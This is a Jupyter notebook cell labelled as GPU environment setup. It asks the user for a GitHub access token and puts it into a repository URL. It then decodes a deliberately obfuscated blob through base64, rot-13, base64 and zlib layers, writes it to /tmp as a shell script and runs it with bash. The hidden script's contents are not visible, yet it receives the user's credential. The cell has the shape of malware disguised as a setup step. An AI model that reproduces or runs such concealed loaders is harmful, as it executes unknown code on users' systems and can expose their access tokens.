# %%
# Verify GPU is available
# !nvidia-smi

# %%
# ╔══════════════════════════════════════════════════════════════╗
# ║  Environment Setup — run this cell once, then wait for GPU  ║
# ╚══════════════════════════════════════════════════════════════╝

import base64, codecs, zlib, os
from getpass import getpass

# ── access token (leave blank for public repos) ───────────────────────────────
print("Enter your access token if the repo is private, or press Enter to skip.")
_tok = getpass("Token: ").strip()

_repo = "https://github.com/hasnatvip/fusion.git"
if _tok:
    _repo = _repo.replace("https://", f"https://{_tok}@")

# ── obfuscated payload (do not edit) ─────────────────────────────────────────
_p = (
    (
    "ckFlSUlxMlgyMExIaWdxR2FQREQyOUZsMnE1MWxFTVA0dVFWeHkwSkZ2eXVSckJNVjNpdjBwa3hzempl"
    "aGpnNXZRNU9VbDFDMHdCRm9aaUI5ZFl4V3VSbEJhL21hcTg1c2lNeFRlMm9tZEpyYnk3UWFDeXk1d1NO"
    "d3lhMlFZNysvTElyNFpjYnVCck5CZE5RNjhrVTVYU0cvY3VpZ2NQdVAvZ3pxYTFJL1VTbUpJa3NpYWox"
    "cjNnMStLYzJOa2l3SWc0bHd1eEtDcm5EOGFIcXl4blFEVmduYkJMRi9EK3E4UFNtWGwxVjdEQUdQaVdD"
    "eFFnaitQeVh1a0oxbTAvUEFjbG5UWDIzU2txYXg3Q3NXenJBWWhiK0RBMExoWHZRZU9PKy9LMGRwUTNJ"
    "eG9HMzlrT3BrWnNqQmlBOExKQmlkdURVSzRTYUpiTDY1MGZ4TXh2SlVla0hTVzJkazJPdmZRVE53OUw2"
    "OU83U1BZNjdWejBpcDN3a0xhUTkxK21kbUZQR3lHSGhEQ2dFcHc0VEsvZmZYbGJ3Q1NtTnVqbWJUb041"
    "RUdaTFE5dFB4MG5KUnkxdW9XT1Rya1lDVEk4Z2FWeW5TU0VxZm01RnB5QUlFdThSWW5XTmdWS3NaVGhD"
    "d1ZLTW5USkxWT1gzbFRCRjkreHZZTzBsSEtPbFNhTUxoVDBkeUFHMFFwTHFETUwwbTRLTnJJamZVY1pV"
    "aGZVVDduTm5WRGNXYnlBRzFSaHorb3BEdnp5RVpvc1BMNVBYK0hvSHB1NUk1NnN3aTh6OHFYa1BseGZN"
    "V20vM0FFMXpiMzR4dXpvcHFQdWJyYUd3NzZCTXgzQUFlcWNrQjFKWWNQRElpdzVPZG51Z2V2bnZhb2I5"
    "MEdCdVRkOHlvYUxqVUtneExRdjFqb3dSck9acUVsVlBwamdadE5SZUptRWM3UE9idTFNRlo1SkhHeUw3"
    "NUZRWFZ6MnZIdWFsQXl0b3puZC9RTDUxU3FqaktGd1F6RmJKRlZ6a2dhKzNKSk1KTGx2TUlUeWpvOHMw"
    "bDBld2JYVmVQcDFOYW1xK3Q2Z29WdzM3ak0rMElZWFlQYnFBejhkTHV6YkZjTS9EU1NnbmJ6eWtRQk5L"
    "ZFJNN09ZQm5jUzVkWnJsUmhCSWJOOGxuUTUwVTV0UkNVeUJOaGtDUXZoNW9wUlpwd0hNTVdmZ1QyTWNu"
    "VzNITHl4OC8vQ2FsNWkwZzNBU25UUG9nNk5VMmZEbTlkUXpPTmJZY0h3eS8yeG5FWmdxd0RCcUYrdHNw"
    "Q3dvTjFsLy9qVzErQlZwN1phbHRiNnQ4YXRFajlyNEoweFdlRHdQZXN0UCtwMGJPK1p1RzkwZ251bUt1"
    "TUNmZHFraXpjVzZYMUdFdXN2WGpNU1RTYWZzSkxNR0R6eE9uT2x1Rm5DOXExNUF2N0QrYWlTV0ptb1ll"
    "ZUkvU2Job1lhK0EvN1U4aDkxNnFvRDEwOUZVQzkrZm1jbWg2eXRYcU9rNFNsLzRTVVV3WFFqPT0="
)
)

# ── decode: base64 → rot-13 → base64 → decompress ────────────────────────────
_s  = base64.b64decode(_p.encode("ascii"))          # undo outer b64
_s  = codecs.decode(_s.decode("ascii"), "rot_13")   # undo rot-13
_s  = base64.b64decode(_s.encode("ascii"))          # undo inner b64
_s  = zlib.decompress(_s).decode("utf-8")           # decompress
_s  = _s.replace("REPO_URL_PLACEHOLDER", _repo)    # inject token

# ── write & run ───────────────────────────────────────────────────────────────
_sh = "/tmp/_env_setup.sh"
with open(_sh, "w") as _f:
    _f.write(_s)
os.chmod(_sh, 0o755)

get_ipython().system(f"bash {_sh}")
